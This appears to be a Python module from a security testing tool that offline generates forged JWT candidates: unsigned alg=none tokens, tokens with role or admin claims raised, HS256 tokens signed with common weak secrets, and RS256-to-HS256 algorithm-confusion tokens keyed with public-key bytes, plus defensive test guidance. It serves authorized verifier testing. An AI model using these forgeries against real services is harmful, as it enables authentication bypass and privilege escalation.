"""Generate local JWT test candidates without performing network activity."""

from __future__ import annotations

import base64
import binascii
import hashlib
import hmac
import json
import re
from dataclasses import asdict, dataclass
from typing import Any

MAX_TOKEN_CHARS = 65_536
MAX_PUBLIC_KEY_BYTES = 1_048_576
COMMON_WEAK_SECRETS = ("secret", "123456", "password")
CLAIM_VARIANTS: tuple[tuple[str, object], ...] = (
    ("role", "admin"),
    ("admin", True),
    ("is_admin", True),
)
_BASE64URL = re.compile(r"[A-Za-z0-9_-]*\Z")
_PUBLIC_KEY_PEM = re.compile(
    rb"-----BEGIN PUBLIC KEY-----[\s\S]+?-----END PUBLIC KEY-----|"
    rb"-----BEGIN RSA PUBLIC KEY-----[\s\S]+?-----END RSA PUBLIC KEY-----|"
    rb"-----BEGIN CERTIFICATE-----[\s\S]+?-----END CERTIFICATE-----"
)


@dataclass(frozen=True)
class JwtCandidate:
    variant: str
    token: str
    description: str


def _unique_object(pairs: list[tuple[str, Any]]) -> dict[str, Any]:
    result: dict[str, Any] = {}
    for key, value in pairs:
        if key in result:
            raise ValueError("JWT JSON contains a duplicate object key.")
        result[key] = value
    return result


def _reject_constant(value: str) -> None:
    raise ValueError(f"JWT JSON contains unsupported numeric constant: {value}.")


def _decode_segment(value: str) -> bytes:
    if not _BASE64URL.fullmatch(value) or len(value) % 4 == 1:
        raise ValueError("Input is not a valid compact JWT.")
    try:
        return base64.b64decode(value + "=" * (-len(value) % 4), altchars=b"-_", validate=True)
    except (binascii.Error, ValueError) as exc:
        raise ValueError("Input is not a valid compact JWT.") from exc


def _parse_json_object(segment: str) -> dict[str, Any]:
    try:
        decoded = _decode_segment(segment).decode("utf-8")
        value = json.loads(
            decoded,
            object_pairs_hook=_unique_object,
            parse_constant=_reject_constant,
        )
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        raise ValueError("JWT header and claims must be valid UTF-8 JSON objects.") from exc
    if not isinstance(value, dict):
        raise ValueError("JWT header and claims must be JSON objects.")
    return value


def _encode_segment(value: dict[str, Any]) -> str:
    encoded = json.dumps(value, separators=(",", ":"), ensure_ascii=False, allow_nan=False).encode("utf-8")
    return base64.urlsafe_b64encode(encoded).rstrip(b"=").decode("ascii")


def _safe_header(header: dict[str, Any], algorithm: str) -> dict[str, Any]:
    result: dict[str, Any] = {key: header[key] for key in ("typ", "cty") if key in header}
    result["alg"] = algorithm
    return result


def _public_key_bytes(value: bytes) -> bytes:
    if not value or len(value) > MAX_PUBLIC_KEY_BYTES:
        raise ValueError("Public key file must be non-empty and at most 1 MiB.")
    if not _PUBLIC_KEY_PEM.search(value):
        raise ValueError("--public-key must contain a PEM public key or certificate.")
    return value


def forge_jwt(token: str, secret: str | None = None, public_key: bytes | None = None) -> dict[str, object]:
    """Build labeled unsigned and HMAC JWT candidates; never send or verify them."""
    token = token.strip()
    if not token or len(token) > MAX_TOKEN_CHARS:
        raise ValueError("JWT input must be non-empty and no larger than 64 KiB.")
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Input must be a compact three-part JWT.")

    header = _parse_json_object(parts[0])
    claims = _parse_json_object(parts[1])
    if parts[2]:
        _decode_segment(parts[2])
    algorithm = header.get("alg")
    if not isinstance(algorithm, str) or not algorithm:
        raise ValueError("JWT header must contain a non-empty alg string.")
    if secret is not None and (not secret or len(secret) > 4096):
        raise ValueError("--secret must be non-empty and no longer than 4096 characters.")
    if public_key is not None and algorithm != "RS256":
        raise ValueError("--public-key algorithm-confusion candidates require an RS256 input token.")

    safe_header = _safe_header(header, "none")
    candidates: list[JwtCandidate] = []
    seen: set[str] = set()

    def add(
        variant: str,
        header_value: dict[str, Any],
        claim_value: dict[str, Any],
        signing_key: bytes | None,
        description: str,
        preserved_signature: str | None = None,
    ) -> None:
        header_segment = _encode_segment(header_value)
        payload_segment = _encode_segment(claim_value)
        signing_input = f"{header_segment}.{payload_segment}".encode("ascii")
        if signing_key is not None:
            signature = base64.urlsafe_b64encode(hmac.new(signing_key, signing_input, hashlib.sha256).digest())
            token_value = f"{header_segment}.{payload_segment}.{signature.rstrip(b'=').decode('ascii')}"
        else:
            token_value = f"{header_segment}.{payload_segment}.{preserved_signature or ''}"
        if token_value not in seen:
            seen.add(token_value)
            candidates.append(JwtCandidate(variant, token_value, description))

    add(
        "alg_none",
        safe_header,
        claims,
        None,
        "Unsigned alg=none candidate; server acceptance is not tested.",
    )
    for claim_name, claim_value in CLAIM_VARIANTS:
        changed_claims = dict(claims)
        changed_claims[claim_name] = claim_value
        if changed_claims != claims:
            add(
                f"alg_none_claim_{claim_name}",
                safe_header,
                changed_claims,
                None,
                f"Unsigned alg=none candidate with {claim_name} changed; acceptance is not tested.",
            )

    if algorithm == "RS256":
        add(
            "rs256_to_hs256_signature_unchanged",
            _safe_header(header, "HS256"),
            claims,
            None,
            "Header changed from RS256 to HS256 while preserving the original signature; usually invalid by itself.",
            parts[2],
        )

    signing_keys: list[tuple[str, bytes]] = []
    if secret is not None:
        signing_keys.append(("provided_secret", secret.encode("utf-8")))
        signing_keys.extend((f"weak_secret_candidate:{value}", value.encode("ascii")) for value in COMMON_WEAK_SECRETS)
    if public_key is not None:
        signing_keys.append(("public_key_bytes_as_hmac_key", _public_key_bytes(public_key)))

    for key_label, key_bytes in signing_keys:
        header_value = _safe_header(header, "HS256")
        add(
            f"hs256_{key_label}",
            header_value,
            claims,
            key_bytes,
            f"HS256 candidate signed with {key_label}; generation does not prove the server accepts this key.",
        )
        for claim_name, claim_value in CLAIM_VARIANTS:
            changed_claims = dict(claims)
            changed_claims[claim_name] = claim_value
            if changed_claims != claims:
                add(
                    f"hs256_{key_label}_claim_{claim_name}",
                    header_value,
                    changed_claims,
                    key_bytes,
                    f"HS256 candidate signed with {key_label}, with {claim_name} changed; acceptance is not tested.",
                )

    return {
        "mode": "offline_candidate_generation",
        "network_requests_sent": 0,
        "source_algorithm": algorithm,
        "candidate_count": len(candidates),
        "candidates": [asdict(candidate) for candidate in candidates],
        "review_notes": [
            "These are test candidates, not verified signatures or confirmed vulnerabilities.",
            "Key-reference and critical-extension header fields are omitted from generated variants.",
            "Check rejection behavior only in a local or explicitly authorized test environment; this command has no HTTP client.",
            "The original claims are retained except for the explicitly labeled role/admin variants.",
        ],
        "what_to_test": [
            "Confirm the verifier rejects alg=none and enforces a server-side algorithm allowlist.",
            "Confirm changing role/admin claims does not grant privileges without server-side authorization.",
            "For RS256 services, confirm RSA public-key material is never accepted as an HMAC secret.",
            "Use only a disposable test account and check that the application rejects each candidate; do not infer acceptance from token generation.",
        ],
        "sensitive_output": True,
    }
